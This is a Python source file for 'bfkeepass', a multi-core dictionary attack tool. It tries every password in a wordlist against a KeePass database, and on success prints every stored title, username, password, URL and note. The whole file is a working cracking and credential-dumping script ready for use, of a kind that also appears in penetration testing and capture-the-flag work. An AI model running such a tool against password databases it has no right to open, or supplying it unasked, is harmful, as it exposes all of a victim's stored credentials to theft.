import argparse
import multiprocessing
from pykeepass import PyKeePass
from tqdm import tqdm

def check_password(args):
    """Worker function to check a single password against the database."""
    password, db_path, key_path = args
    try:
        kp = PyKeePass(db_path, password=password, keyfile=key_path)
        # On success, return the password and the entries for later output
        return (password, kp.entries)
    except Exception:
        # On failure (e.g., wrong password), return None
        return None

def main():
    argParser = argparse.ArgumentParser(description="A multi-core script to test passwords against a KeePass database.")
    argParser.add_argument("-d", "--database", type=str, help="KeePass database file (.kdbx)", required=True)
    argParser.add_argument("-w", "--wordlist", type=str, help="Wordlist to use", required=True)
    argParser.add_argument("-k", "--keyfile", type=str, help="Key file to use with the database")
    argParser.add_argument("-c", "--cores", type=int, help="Number of CPU cores to use (default: all available)")
    argParser.add_argument("-o", "--output", help="Output entries on success", action="store_true")
    args = argParser.parse_args()

    print(f"[*] bfkeepass multi-core script initialized.")
    print(f"[>] Target Database: {args.database}")
    print(f"[>] Wordlist File: {args.wordlist}")
    if args.keyfile:
        print(f"[>] Key File: {args.keyfile}")

    try:
        print("[>] Reading wordlist into memory...")
        with open(args.wordlist, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        if not passwords:
            print("[ERROR] Wordlist is empty or could not be read.")
            return

        total_passwords = len(passwords)
        print(f"[>] {total_passwords} passwords loaded.")

        # Determine the number of cores to use
        available_cores = multiprocessing.cpu_count()
        num_processes = available_cores
        if args.cores and 0 < args.cores <= available_cores:
            num_processes = args.cores
            print(f"[*] Using specified {num_processes} of {available_cores} available CPU cores.")
        else:
            print(f"[*] Using all {available_cores} available CPU cores by default.")

        # Prepare the arguments for each parallel task
        tasks = [(pw, args.database, args.keyfile) for pw in passwords]
        
        found_password = None
        found_entries = None

        print("[*] Starting the cracking process...")
        # A pool of worker processes is created to handle the tasks in parallel.
        # 'imap_unordered' is used for efficiency, returning results as they are completed.
        with multiprocessing.Pool(processes=num_processes) as pool:
            with tqdm(total=total_passwords, desc="Testing Passwords", unit="pw") as pbar:
                for result in pool.imap_unordered(check_password, tasks):
                    pbar.update(1)
                    if result:
                        found_password, found_entries = result
                        print("\n\n[*] Password found! Terminating worker processes...")
                        pool.terminate() # Stop all other processes immediately
                        break
        
        print("\n" + "="*35)
        if found_password:
            print(f"[SUCCESS] 🥳 Password found: {found_password}")
            print("="*35 + "\n")

            if args.output and found_entries:
                print("[>] Dumping entries...")
                print("-" * 20)
                for entry in found_entries:
                    print(f"    Title: {entry.title}")
                    print(f"    Username: {entry.username}")
                    print(f"    Password: {entry.password}")
                    print(f"    URL: {entry.url}")
                    if entry.notes:
                        print(f"    Notes: {entry.notes}")
                    print("-" * 20)
                print("[>] Entry dump complete.")
        else:
            print("[FAILURE] 😔 Password not found in the wordlist.")
            print("="*35 + "\n")

    except FileNotFoundError:
        print(f"[ERROR] The file '{args.wordlist}' or '{args.database}' was not found.")
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred: {e}")
    
    print("[*] Done.")

if __name__ == '__main__':
    multiprocessing.freeze_support()
    main()
